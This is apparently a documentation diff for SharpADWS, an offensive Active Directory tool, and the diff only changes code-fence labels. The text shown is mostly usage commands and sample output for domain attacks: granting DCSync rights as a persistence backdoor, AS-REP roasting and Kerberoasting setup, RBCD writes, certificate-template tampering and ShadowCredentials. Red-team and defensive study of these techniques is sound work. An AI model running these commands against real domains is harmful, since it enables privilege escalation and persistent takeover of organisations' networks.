@@ -136,7 +136,7 @@ FindDelegation options:
 
 When SharpADWS enumerates the ACL, in order not to perform additional ADWS requests for each unknown trustee object, it is necessary to create a complete cache of all account objects in advance through the cache method and save it to a file, thereby avoiding a large number of (unnecessary) flow. The cache contains a mapping of each account object name within the current domain to its objectSid.
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Cache
 
 [*] Cache file has been generated: object.cache
@@ -147,7 +147,7 @@ C:\Users\Marcus>SharpADWS.exe Cache
 
 The Acl method can enumerate the DACL of the object specifying `-dn`, and supports filtering the enumerated DACL through the `-trustee`, `-right` and `-rid` parameters. For example, we want to enumerate all Domain Controller objects and filter out the DACL whose trustee is Marcus, as follows:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe acl -dn "OU=Domain Controllers,DC=corp,DC=local" -scope Subtree -trustee Marcus
 
  Severity              : Critical
@@ -162,7 +162,7 @@ C:\Users\Marcus>SharpADWS.exe acl -dn "OU=Domain Controllers,DC=corp,DC=local" -
 
 For another example, we want to enumerate all User objects and filter out DACLs with GenericWrite permissions and trustee RID greater than 1000, as shown below:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe acl -dn "CN=Users,DC=corp,DC=local" -scope Subtree -right Generic -rid 1000
 
  Severity              : Critical
@@ -177,7 +177,7 @@ C:\Users\Marcus>SharpADWS.exe acl -dn "CN=Users,DC=corp,DC=local" -scope Subtree
 
 In addition, the Acl method also supports enumeration of specific objects:
 
-```powershell
+```cmd
 SharpADWS.exe -user                # Enumerate DACL for all user objects
 SharpADWS.exe -computer            # Enumerate DACL for all computer objects
 SharpADWS.exe -group               # Enumerate DACL for all group objects
@@ -192,7 +192,7 @@ SharpADWS.exe -gpo                 # Enumerate DACL for all gpo objects
 
 The `list` action of the DCSync method can query all accounts that have been granted the DS-Replication-Get-Changes, DS-Replication-Get-Changes-All and DS-Replication-Get-Changes-In-Filtered-Set permissions, as follows Show:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe DCSync -action list
 
  Severity              : Info
@@ -225,7 +225,7 @@ C:\Users\Marcus>SharpADWS.exe DCSync -action list
 
 Additionally, given sufficient permissions, you can grant DCSync permissions to an account via `write` to establish a domain persistence backdoor:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe DCSync -action write -target Marcus
 
 [*] Account Marcus now has DCSync privieges on the domain.
@@ -236,7 +236,7 @@ C:\Users\Marcus>SharpADWS.exe DCSync -action write -target Marcus
 
 The `list` action of the DontReqPreAuth method can find all accounts with the "Do not require kerberos preauthentication" option set, as shown below:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe DontReqPreAuth -action list
 
 [*] Found users that do not require kerberos preauthentication:
@@ -248,7 +248,7 @@ C:\Users\Marcus>SharpADWS.exe DontReqPreAuth -action list
 
 Additionally, you can abuse WriteProperty permissions on the target account's userAccountControl property by enabling the "Do not require kerberos preauthentication" option for that account via `write` action to perform an AS-REP Roasting attack:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe DontReqPreAuth -action write -target Administrator
 
 [*] Set DontReqPreAuth for user Administrator successfully!
@@ -259,7 +259,7 @@ C:\Users\Marcus>SharpADWS.exe DontReqPreAuth -action write -target Administrator
 
 The `list` action of the Kerberoastable method can find all accounts with SPN set up, as shown below:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Kerberoastable -action list
 
 [*] Found kerberoastable users:
@@ -275,7 +275,7 @@ C:\Users\Marcus>SharpADWS.exe Kerberoastable -action list
 
 Additionally, you can abuse WriteProperty permissions on the target account's servicePrincipalName property to perform a Kerberoasting attack by adding an SPN to that account (user accounts only) via `write` action:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Kerberoastable -action write -target Administrator
 
 [*] Kerberoast user Administrator successfully!
@@ -286,7 +286,7 @@ C:\Users\Marcus>SharpADWS.exe Kerberoastable -action write -target Administrator
 
 The AddComputer method allows you to create a new computer account within the scope of the `ms-DS-MachineAccountQuota` attribute value, which can be used in subsequent RBCD attacks.
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe AddComputer -computer-name PENTEST$ -computer-pass Passw0rd
 
 [*] Successfully added machine account PENTEST$ with password Passw0rd.
@@ -297,7 +297,7 @@ C:\Users\Marcus>SharpADWS.exe AddComputer -computer-name PENTEST$ -computer-pass
 
 The `read` action of the RBCD method can read the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute value of the specified account object to check who has the right to resources delegate to the account, as shown below:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe RBCD -action read -delegate-to DC01$
 
 [*] Accounts allowed to act on behalf of other identity:
@@ -309,7 +309,7 @@ C:\Users\Marcus>SharpADWS.exe RBCD -action read -delegate-to DC01$
 
 The `write` action of the RBCD method can write to the `msDS-AllowedToActOnBehalfOfOtherIdentity` property of the target account object for Resource-Based Constrained Delegation attacks. As shown below, we first create a new extreme account `PENTEST$` using the AddComputer method, and then we can execute the following command to write the SID of `PENTEST$` into the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of `DC01$`:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe RBCD -action write -delegate-to DC01$ -delegate-from PENTEST$
 
 [*] Delegation rights modified successfully!
@@ -321,7 +321,7 @@ C:\Users\Marcus>SharpADWS.exe RBCD -action write -delegate-to DC01$ -delegate-fr
 
 In addition, the SID added in `write` action can be removed from the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute of the target object through `remove` action:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe RBCD -action remove -delegate-to DC01$ -delegate-from PENTEST$
 
 [*] Delegation rights modified successfully!
@@ -334,7 +334,7 @@ C:\Users\Marcus>SharpADWS.exe RBCD -action remove -delegate-to DC01$ -delegate-f
 
 The `find` action of the Certify method can enumerate the data in ADCS, including all certificate authorities and certificate templates, just like [Certify](https://github.com/GhostPack/Certify):
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Certify -action find
 
 [*] Find CA and certificate templates
@@ -435,7 +435,7 @@ C:\Users\Marcus>SharpADWS.exe Certify -action find
 
 In addition, `find` action supports the `-enrolleeSuppliesSubject` and `-clientAuth` options, which can filter out all certificate templates that have the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag turned on and support Client Authentication:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Certify -action find -enrolleeSuppliesSubject -clientAuth
 
 [*] Find CA and certificate templates
@@ -481,7 +481,7 @@ C:\Users\Marcus>SharpADWS.exe Certify -action find -enrolleeSuppliesSubject -cli
 
 The `modify` action of the Certify method allows you to modify the properties of the certificate template, such as turning on the `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag or enabling Client Authentication, if you have write access to the target template:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Certify -action modify -template User -enrolleeSuppliesSubject -clientAuth
 
 [*] Enable enrollee supplies subject for template User successfully!
@@ -495,7 +495,7 @@ The Whisker method is able to perform the lifecycle of a ShadowCredentials attac
 
 The `list` action of the Whisker method can list the `msDS-KeyCredentialLink` attribute value of the target account object:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Whisker -action list -target DC01$
 
 [*] List deviced for DC01$:
@@ -507,7 +507,7 @@ C:\Users\Marcus>SharpADWS.exe Whisker -action list -target DC01$
 
 The Whisker method's `add` action allows you to add a Key to the target account's `msDS-KeyCredentialLink` property to perform a ShadowCredentials attack if you have write access:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Whisker -action add -target Administrator -cert-pass Passw0rd
 
 [*] Certificate generaged
@@ -564,7 +564,7 @@ C:\Users\Marcus>SharpADWS.exe Whisker -action add -target Administrator -cert-pa
 
 Additionally, with `remove` action you can provide `-device-id` to remove the specified Key from the `msDS-KeyCredentialLink` property of the target object:
 
-```powershell
+```cmd
 C:\Users\Marcus>SharpADWS.exe Whisker -action remove -target DC01$ -device-id c9fdae6b-f6a1-4880-a498-6dc89814e596
 
 [*] Found value to remove
@@ -577,7 +577,7 @@ C:\Users\Marcus>SharpADWS.exe Whisker -action remove -target DC01$ -device-id c9
 
 The FindDelegation method can enumerate all delegation relationships in the current domain. This method has no redundant options or parameters:
 
-```powershell
+```cmd
 C:\Users\Marcus\desktop>SharpADWS.exe FindDelegation
 
 AccountName  AccountType  DelegationType                      DelegationRightsTo
